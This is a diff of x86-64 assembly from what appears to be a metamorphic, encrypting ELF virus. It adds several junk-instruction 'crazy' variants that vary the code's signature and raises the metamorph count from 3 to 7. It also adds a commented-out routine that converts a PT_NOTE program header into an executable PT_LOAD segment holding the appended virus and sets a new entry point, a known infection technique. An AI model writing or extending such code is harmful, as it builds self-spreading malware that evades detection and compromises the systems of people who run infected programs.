@@ -772,7 +772,7 @@ section .text
         CALL_ENCRYPT(set_unique_trace)
 
 	.mod_functions:
-        CALL_METAMORPH(crazy, 3)
+        CALL_METAMORPH(crazy, 7)
 
     .encrypt_data_block:
         CALL_ENCRYPT(encrypt_block) ; encripta
@@ -868,8 +868,8 @@ section .text
     Traza_len       equ     $ - Traza - 1 - 8 - 1
 
     __F_crazy_0:
-        dec rax
         inc rax
+        dec rax
         nop
         inc rbx
         dec rbx
@@ -895,12 +895,12 @@ section .text
     __F_crazy_0__end:
 
     __F_crazy_1:
-        inc rdx
-        inc rax
         dec rax
         nop
         inc rbx
         dec rbx
+        inc rax
+        inc rdx
         inc rdx
         dec rdx
         dec rdx
@@ -922,9 +922,9 @@ section .text
     __F_crazy_1__end:
 
     __F_crazy_2:
-        nop
         inc rax
         dec rax
+        nop
         inc rbx
         dec rbx
         inc rdx
@@ -947,5 +947,135 @@ section .text
         cmp rbx, rsi
         ret
     __F_crazy_2__end:
+
+    __F_crazy_3:
+        inc rbx
+        inc rax
+        dec rax
+        nop
+        dec rbx
+        inc rdx
+        inc rdx
+        dec rdx
+        dec rdx
+        nop
+        cmp rbx, rbx
+        mov rax, rax
+        xchg rax, rax
+        nop word [rax+rax]
+        nop dword [rax+rax]
+        lea rax, [rax]
+        add rax, 0
+        sub rax, 0
+        or  rax, 0
+        and rax, -1
+        not rax
+        not rax
+        cmp rbx, rsi
+        ret
+    __F_crazy_3__end:
+
+    __F_crazy_4:
+        inc rbx
+        dec rbx
+        inc rdx
+        inc rdx
+        dec rdx
+        dec rdx
+        inc rax
+        dec rax
+        nop
+        nop
+        cmp rbx, rbx
+        mov rax, rax
+        xchg rax, rax
+        nop word [rax+rax]
+        nop dword [rax+rax]
+        lea rax, [rax]
+        add rax, 0
+        sub rax, 0
+        or  rax, 0
+        and rax, -1
+        not rax
+        not rax
+        cmp rbx, rsi
+        ret
+    __F_crazy_4__end:
+
+    __F_crazy_5:
+        dec rdx
+        dec rdx
+        nop
+        cmp rbx, rbx
+        mov rax, rax
+        xchg rax, rax
+        nop word [rax+rax]
+        nop dword [rax+rax]
+        lea rax, [rax]
+        add rax, 0
+        inc rax
+        dec rax
+        nop
+        inc rbx
+        dec rbx
+        inc rdx
+        inc rdx
+        sub rax, 0
+        or  rax, 0
+        and rax, -1
+        not rax
+        not rax
+        cmp rbx, rsi
+        ret
+    __F_crazy_5__end:
+
+    __F_crazy_6:
+        dec rdx
+        dec rdx
+        nop
+        cmp rbx, rbx
+        mov rax, rax
+        xchg rax, rax
+        nop word [rax+rax]
+        nop dword [rax+rax]
+        lea rax, [rax]
+        inc rax
+        dec rax
+        nop
+        inc rbx
+        dec rbx
+        inc rdx
+        inc rdx
+        add rax, 0
+        sub rax, 0
+        or  rax, 0
+        and rax, -1
+        not rax
+        not rax
+        cmp rbx, rsi
+        ret
+    __F_crazy_6__end:
+
+    ; __F_mod_pt_note_0:
+    ;     ; Death.note_phdr_ptr es una dirección de memoria que apunta a un puntero
+    ;     lea rax, VAR(Death.note_phdr_ptr)
+    ;     mov rax, [rax]
+    ;     mov [rax], dword 0x01                           ; p_type = PT_LOAD
+    ;     mov [rax+Elf64_Phdr.p_flags], dword P_FLAGS     ; P_FLAGS = PF_X | PF_R | PF_W
+    ;     mov ecx, dword VAR(Death.file_final_len)
+    ;     sub ecx, dword VAR(Death.virus_size)
+    ;     mov [rax+Elf64_Phdr.p_offset], rcx              ; p_offset = file_final_len - virus_size
+    ;     mov VAR(Death.virus_offset), rcx
+    ;     mov rcx, VAR(Death.max_vaddr_end)
+    ;     ALIGN rcx
+    ;     mov [rax+Elf64_Phdr.p_vaddr], rcx               ; p_vaddr = ALIGN(max_pvaddr_len)
+    ;     mov [rax+Elf64_Phdr.p_paddr], rcx               ; p_paddr = p_vaddr
+    ;     mov VAR(Death.new_entry), rcx
+    ;     mov ecx, dword VAR(Death.virus_size)
+    ;     mov [rax+Elf64_Phdr.p_filesz], rcx              ; p_filesz = virus_size
+    ;     mov [rax+Elf64_Phdr.p_memsz], rcx               ; p_memsz = virus_size
+    ;     mov qword [rax+Elf64_Phdr.p_align], 0x1000      ; p_align = 0x1000 (4KB)
+    ;     ret
+    ; __F_mod_pt_note_0__end:
 
     _finish:
